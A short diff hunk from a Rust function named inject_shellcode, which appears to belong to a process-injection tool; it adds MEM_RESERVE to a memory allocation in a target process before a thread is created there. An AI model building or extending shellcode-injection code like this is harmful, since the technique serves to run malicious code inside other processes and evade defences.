@@ -213,7 +213,7 @@ fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
         // create a thread on it.
         let mut base: *mut c_void = null_mut();
         let mut size: usize = buf.len();
-        let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT, PAGE_READWRITE);
+        let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(s) {
             return;
         }
